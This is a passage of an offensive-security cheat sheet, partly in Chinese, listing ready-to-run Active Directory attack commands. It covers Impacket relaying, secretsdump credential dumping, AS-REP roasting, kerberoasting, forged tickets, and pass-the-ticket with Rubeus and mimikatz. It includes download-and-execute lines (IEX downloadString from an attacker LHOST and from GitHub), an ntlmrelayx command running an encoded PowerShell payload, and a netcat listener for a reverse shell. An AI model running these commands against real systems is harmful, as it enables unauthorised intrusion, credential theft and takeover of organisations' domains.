<h5 id="IMPACKET-GETST"><a href="#IMPACKET-GETST" class="headerlink" title="IMPACKET-GETST"></a>IMPACKET-GETST</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-getST &lt;DOMAIN&gt;/&lt;USERNAME&gt; -spn &lt;USERNAME&gt;/&lt;RHOST&gt; -hashes :&lt;HASH&gt; -impersonate &lt;USERNAME&gt;<br>impacket-getST &lt;DOMAIN&gt;/&lt;USERNAME&gt;$ -spn &lt;USERNAME&gt;/&lt;RHOST&gt; -hashes :&lt;HASH&gt; -impersonate &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-GETTGT"><a href="#IMPACKET-GETTGT" class="headerlink" title="IMPACKET-GETTGT"></a>IMPACKET-GETTGT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">impacket-getTGT &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;<br>impacket-getTGT &lt;RHOST&gt;/&lt;USERNAME&gt; -dc-ip &lt;RHOST&gt; -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>c662956a4a0486a80fbb2403c5a9c2c<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-GETNPUSERS"><a href="#IMPACKET-GETNPUSERS" class="headerlink" title="IMPACKET-GETNPUSERS"></a>IMPACKET-GETNPUSERS</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast<br>impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile usernames.txt -format john -outputfile hashes<br>impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USERNAME&gt; -request -no-pass -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-GETUSERSPNS"><a href="#IMPACKET-GETUSERSPNS" class="headerlink" title="IMPACKET-GETUSERSPNS"></a>IMPACKET-GETUSERSPNS</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">impacket-GetUserSPNs -request -dc-ip &lt;RHOST&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br>impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -k -dc-ip &lt;RHOST&gt;.&lt;DOMAIN&gt; -no-pass -request<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SECRETSDUMP"><a href="#IMPACKET-SECRETSDUMP" class="headerlink" title="IMPACKET-SECRETSDUMP"></a>IMPACKET-SECRETSDUMP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">impacket-secretsdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt;<br>impacket-secretsdump -dc-ip &lt;RHOST&gt; &lt;DOMAIN&gt;/&lt;SUERNAME&gt;:&lt;PASSWORD&gt;@&lt;RHOST&gt;<br>impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL<br>impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br>impacket-secretsdump -k &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt;.&lt;DOMAIN&gt; -no-pass -debug<br></code></pre></td></tr></table></figure>


<h5 id="IMPACKET-LOOKUPSID"><a href="#IMPACKET-LOOKUPSID" class="headerlink" title="IMPACKET-LOOKUPSID"></a>IMPACKET-LOOKUPSID</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-lookupsid &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-NETVIEW"><a href="#IMPACKET-NETVIEW" class="headerlink" title="IMPACKET-NETVIEW"></a>IMPACKET-NETVIEW</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-netview &lt;DOMAIN&gt;/&lt;USERNAME&gt; -targets /PATH/TO/FILE/&lt;FILE&gt;.txt -users /PATH/TO/FILE/&lt;FILE&gt;.txt<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-NTLMRELAYX"><a href="#IMPACKET-NTLMRELAYX" class="headerlink" title="IMPACKET-NTLMRELAYX"></a>IMPACKET-NTLMRELAYX</h5><h6 id="Common-Commands"><a href="#Common-Commands" class="headerlink" title="Common Commands"></a>Common Commands</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-ntlmrelayx -t ldap:<span class="hljs-comment">//&lt;RHOST&gt; --no-wcf-server --escalate-user &lt;USERNAME&gt;</span><br></code></pre></td></tr></table></figure>

<h6 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-ntlmrelayx --no-http-server -smb2support -t &lt;RHOST&gt; -c <span class="hljs-string">&quot;powershell -enc JABjAGwAaQBlAG4AdA&lt;--- CUT FOR BREVITY ---&gt;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">dir \\&lt;LHOST&gt;\foobar<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nc -lnvp &lt;LPORT&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-PSEXEC"><a href="#IMPACKET-PSEXEC" class="headerlink" title="IMPACKET-PSEXEC"></a>IMPACKET-PSEXEC</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">impacket-psexec &lt;USERNAME&gt;@&lt;RHOST&gt;<br>impacket-psexec &lt;RHOST&gt;/administrator@&lt;RHOST&gt; -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">8</span>a4b77d52b1845bfe949ed1b9643bb18<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-REG"><a href="#IMPACKET-REG" class="headerlink" title="IMPACKET-REG"></a>IMPACKET-REG</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-reg &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD:PASSWORD_HASH&gt;@&lt;RHOST&gt; &lt;COMMAND&gt; &lt;COMMAND&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-RPCDUMP"><a href="#IMPACKET-RPCDUMP" class="headerlink" title="IMPACKET-RPCDUMP"></a>IMPACKET-RPCDUMP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-rpcdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SAMRDUMP"><a href="#IMPACKET-SAMRDUMP" class="headerlink" title="IMPACKET-SAMRDUMP"></a>IMPACKET-SAMRDUMP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-samrdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SERVICES"><a href="#IMPACKET-SERVICES" class="headerlink" title="IMPACKET-SERVICES"></a>IMPACKET-SERVICES</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-services &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt; &lt;COMMAND&gt;<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SMBPASSWD"><a href="#IMPACKET-SMBPASSWD" class="headerlink" title="IMPACKET-SMBPASSWD"></a>IMPACKET-SMBPASSWD</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-smbpasswd &lt;RHOST&gt;/&lt;USERNAME&gt;:<span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span>@&lt;RHOST&gt; -newpass <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SMBSERVER"><a href="#IMPACKET-SMBSERVER" class="headerlink" title="IMPACKET-SMBSERVER"></a>IMPACKET-SMBSERVER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-smbserver local . -smb2support<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-TICKETER"><a href="#IMPACKET-TICKETER" class="headerlink" title="IMPACKET-TICKETER"></a>IMPACKET-TICKETER</h5><h6 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h6><ul>
<li>有效用户</li>
<li>NTHASH</li>
<li>域SID</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br>impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span> -domain &lt;RHOST&gt; -spn MSSQLSVC/&lt;RHOST&gt;.&lt;RHOST&gt; -user-id <span class="hljs-number">500</span> Administrator<br></code></pre></td></tr></table></figure>

<h5 id="修复-异常必须从-BaseException-派生"><a href="#修复-异常必须从-BaseException-派生" class="headerlink" title="修复 [-] 异常必须从 BaseException 派生"></a>修复 [-] 异常必须从 BaseException 派生</h5><h6 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">impacket-GetUserSPNs &lt;RHOST&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -k -dc-ip &lt;DOMAIN_CONTROLLER&gt;.&lt;RHOST&gt; -no-pass -request<br>Impacket v0<span class="hljs-number">.10</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2022</span> SecureAuth Corporation<br><br>[-] exceptions must derive from BaseException<br></code></pre></td></tr></table></figure>

<h6 id="如何修复它"><a href="#如何修复它" class="headerlink" title="如何修复它"></a>如何修复它</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">241</span>         <span class="hljs-keyword">if</span> self.__doKerberos:<br><span class="hljs-number">242</span>             <span class="hljs-meta">#target = self.getMachineName()</span><br><span class="hljs-number">243</span>             target = self.__kdcHost<br></code></pre></td></tr></table></figure>

<h5 id="dacledit-py"><a href="#dacledit-py" class="headerlink" title="dacledit.py"></a>dacledit.py</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py">https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 dacledit.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -k -target-dn <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=&lt;DOMAIN&gt;&#x27;</span> -dc-ip &lt;RHOST&gt; -action read -principal <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -target <span class="hljs-string">&#x27;&lt;GROUP&gt;&#x27;</span> -debug<br></code></pre></td></tr></table></figure>

<h6 id="修复-msada-guids-错误"><a href="#修复-msada-guids-错误" class="headerlink" title="修复 msada_guids 错误"></a>修复 msada_guids 错误</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS</span><br>from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS<br></code></pre></td></tr></table></figure>

<p>然后将其<code>msada_guids.py</code>放入同一目录<code>dacledit.py</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py">https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py</a></p>
</blockquote>
<h5 id="owneredit-py"><a href="#owneredit-py" class="headerlink" title="owneredit.py"></a>owneredit.py</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py">https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 owneredit.py -k <span class="hljs-string">&#x27;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;&#x27;</span> -dc-ip &lt;RHOST&gt; -action write -new-owner <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -target <span class="hljs-string">&#x27;&lt;GROUP&gt;&#x27;</span> -debug<br></code></pre></td></tr></table></figure>



<h4 id="JAWS"><a href="#JAWS" class="headerlink" title="JAWS"></a>JAWS</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">IEX(New-Object Net.webclient).downloadString(<span class="hljs-string">&#x27;http://&lt;LHOST&gt;:&lt;LPORT&gt;/jaws-enum.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure>



<h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</a></p>
</blockquote>
<h5 id="一般注意事项"><a href="#一般注意事项" class="headerlink" title="一般注意事项"></a>一般注意事项</h5><ul>
<li>金票是票证授予票证（TGT），完全离线伪造（需要 KRBTGT 帐户哈希）。</li>
<li>Silver Ticket 是伪造的服务身份验证票证（需要服务主体名称 (SPN) 和机器帐户密钥（RC4 或 AES 中的哈希值））。银票不接触域控制器 (DC)。</li>
<li>钻石票本质上是黄金票，但由域控制器 (DC) 请求。</li>
</ul>
<h5 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./kerbrute -domain &lt;DOMAIN&gt; -users &lt;FILE&gt; -passwords &lt;FILE&gt; -outputfile &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="与用户列表"><a href="#与用户列表" class="headerlink" title="与用户列表"></a>与用户列表</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe brute /users:&lt;FILE&gt; /passwords:&lt;FILE&gt; /domain:&lt;DOMAIN&gt; /outfile:&lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="检查域中所有用户的密码"><a href="#检查域中所有用户的密码" class="headerlink" title="检查域中所有用户的密码"></a>检查域中所有用户的密码</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe brute /passwords:&lt;FILE&gt; /outfile:&lt;FILE&gt;<br></code></pre></td></tr></table></figure>



<h5 id="ASPREPROAST"><a href="#ASPREPROAST" class="headerlink" title="ASPREPROAST"></a>ASPREPROAST</h5><h6 id="检查所有域用户的-ASPREPRoast（需要凭据）"><a href="#检查所有域用户的-ASPREPRoast（需要凭据）" class="headerlink" title="检查所有域用户的 ASPREPRoast（需要凭据）"></a>检查所有域用户的 ASPREPRoast（需要凭据）</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -request -format hashcat -outputfile &lt;FILE&gt;<br>impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -request -format john -outputfile &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="检查-ASPREPRoast-中的用户列表（无需凭据）"><a href="#检查-ASPREPRoast-中的用户列表（无需凭据）" class="headerlink" title="检查 ASPREPRoast 中的用户列表（无需凭据）"></a>检查 ASPREPRoast 中的用户列表（无需凭据）</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;FILE&gt; -format hashcat -outputfile &lt;FILE&gt;<br>impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;FILE&gt; -format john -outputfile &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="检查域中所有域用户的-ASREPROAST"><a href="#检查域中所有域用户的-ASREPROAST" class="headerlink" title="检查域中所有域用户的 ASREPROAST"></a>检查域中所有域用户的 ASREPROAST</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe asreproast  /format:hashcat /outfile:&lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="KERBEROROASTING"><a href="#KERBEROROASTING" class="headerlink" title="KERBEROROASTING"></a>KERBEROROASTING</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -outputfile &lt;FILE&gt;<br>.\Rubeus.exe kerberoast /outfile:&lt;FILE&gt;<br>iex (new-object Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&quot;</span>)<br>Invoke-Kerberoast -OutputFormat hashcat | % &#123; $_.Hash &#125; | Out-File -Encoding ASCII &lt;FILE&gt;<br>Invoke-Kerberoast -OutputFormat john | % &#123; $_.Hash &#125; | Out-File -Encoding ASCII &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="跳过哈希-传递密钥-PTK"><a href="#跳过哈希-传递密钥-PTK" class="headerlink" title="跳过哈希&#x2F;传递密钥 (PTK)"></a>跳过哈希&#x2F;传递密钥 (PTK)</h5><h6 id="请求带有哈希值的-TGT"><a href="#请求带有哈希值的-TGT" class="headerlink" title="请求带有哈希值的 TGT"></a>请求带有哈希值的 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt; -hashes &lt;LMHASH&gt;:&lt;NTLMHASH&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用-aesKey-请求-TGT（更安全的加密，可能更隐蔽，因为默认使用它）"><a href="#使用-aesKey-请求-TGT（更安全的加密，可能更隐蔽，因为默认使用它）" class="headerlink" title="使用 aesKey 请求 TGT（更安全的加密，可能更隐蔽，因为默认使用它）"></a>使用 aesKey 请求 TGT（更安全的加密，可能更隐蔽，因为默认使用它）</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt; -aesKey &lt;KEY&gt;<br></code></pre></td></tr></table></figure>

<h6 id="使用密码请求-TGT"><a href="#使用密码请求-TGT" class="headerlink" title="使用密码请求 TGT"></a>使用密码请求 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;<br></code></pre></td></tr></table></figure>

<h6 id="设置-Impacket-使用的-TGT"><a href="#设置-Impacket-使用的-TGT" class="headerlink" title="设置 Impacket 使用的 TGT"></a>设置 Impacket 使用的 TGT</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br></code></pre></td></tr></table></figure>

<h6 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br></code></pre></td></tr></table></figure>

<h6 id="询问并注入票据"><a href="#询问并注入票据" class="headerlink" title="询问并注入票据"></a>询问并注入票据</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe asktgt /domain:&lt;DOMAIN&gt; /user:&lt;USERNAME&gt; /rc4:&lt;NTLMHASH&gt; /ptt<br></code></pre></td></tr></table></figure>

<h6 id="在远程主机上执行-CMD"><a href="#在远程主机上执行-CMD" class="headerlink" title="在远程主机上执行 CMD"></a>在远程主机上执行 CMD</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd<br></code></pre></td></tr></table></figure>

<h5 id="票据传递攻击-PTT"><a href="#票据传递攻击-PTT" class="headerlink" title="票据传递攻击 (PTT)"></a>票据传递攻击 (PTT)</h5><h6 id="Linux-上的收获票"><a href="#Linux-上的收获票" class="headerlink" title="Linux 上的收获票"></a>Linux 上的收获票</h6><h6 id="检查门票的类型和位置"><a href="#检查门票的类型和位置" class="headerlink" title="检查门票的类型和位置"></a>检查门票的类型和位置</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">grep default_ccache_name /etc/krb5.conf<br></code></pre></td></tr></table></figure>

<ul>
<li>如果没有返回，则默认为 FILE:&#x2F;tmp&#x2F;krb5cc_%{uid}</li>
<li>如果是文件票证，可以复制粘贴它们来使用它们</li>
<li>如果是KEYRING门票，可以使用工具门票获取</li>
<li>要转储用户票证，如果是 root，建议通过注入其他用户进程来转储它们</li>
<li>要注入，必须将票证复制到所有用户可访问的文件夹中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cp tickey /tmp/tickey<br>/tmp/tickey -i<br></code></pre></td></tr></table></figure>

<h6 id="来自-Windows-的收获门票"><a href="#来自-Windows-的收获门票" class="headerlink" title="来自 Windows 的收获门票"></a>来自 Windows 的收获门票</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sekurlsa::tickets /export<br>.\Rubeus dump<br></code></pre></td></tr></table></figure>

<h6 id="将-Rubeus-转储的-Ticket-转换为-base64"><a href="#将-Rubeus-转储的-Ticket-转换为-base64" class="headerlink" title="将 Rubeus 转储的 Ticket 转换为 base64"></a>将 Rubeus 转储的 Ticket 转换为 base64</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[IO.File]::WriteAllBytes(<span class="hljs-string">&quot;&lt;TICKET&gt;.kirbi&quot;</span>, [Convert]::FromBase64String(<span class="hljs-string">&quot;&lt;TICKET&gt;&quot;</span>))<br></code></pre></td></tr></table></figure>

<h6 id="使用-Ticket-converter-py-在-Linux-和-Windows-格式之间转换票据"><a href="#使用-Ticket-converter-py-在-Linux-和-Windows-格式之间转换票据" class="headerlink" title="使用 Ticket_converter.py 在 Linux 和 Windows 格式之间转换票据"></a>使用 Ticket_converter.py 在 Linux 和 Windows 格式之间转换票据</h6><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Zer1t0/ticket_converter">https://github.com/Zer1t0/ticket_converter</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">python ticket_converter.py ticket.kirbi ticket.ccache<br>python ticket_converter.py ticket.ccache ticket.kirbi<br></code></pre></td></tr></table></figure>

<h6 id="在-Linux-上使用票证"><a href="#在-Linux-上使用票证" class="headerlink" title="在 Linux 上使用票证"></a>在 Linux 上使用票证</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br></code></pre></td></tr></table></figure>

<h6 id="使用-TGT-执行远程命令"><a href="#使用-TGT-执行远程命令" class="headerlink" title="使用 TGT 执行远程命令"></a>使用 TGT 执行远程命令</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br>impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass<br></code></pre></td></tr></table></figure>

<h6 id="在-Windows-上使用票证"><a href="#在-Windows-上使用票证" class="headerlink" title="在 Windows 上使用票证"></a>在 Windows 上使用票证</h6><h6 id="使用-mimikatz-注入-Ticket"><a href="#使用-mimikatz-注入-Ticket" class="headerlink" title="使用 mimikatz 注入 Ticket"></a>使用 mimikatz 注入 Ticket</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::ptt &lt;KIRBI_FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="用-Rubeus-注入票据"><a href="#用-Rubeus-注入票据" class="headerlink" title="用 Rubeus 注入票据"></a>用 Rubeus 注入票据</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe ptt /ticket:&lt;KIRBI_FILE&gt;<br></code></pre></td></tr></table></figure>

<h6 id="在远程主机上执行-CMD-1"><a href="#在远程主机上执行-CMD-1" class="headerlink" title="在远程主机上执行 CMD"></a>在远程主机上执行 CMD</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PsExec.exe -accepteula \\&lt;RHOST&gt; cmd<br></code></pre></td></tr></table></figure>

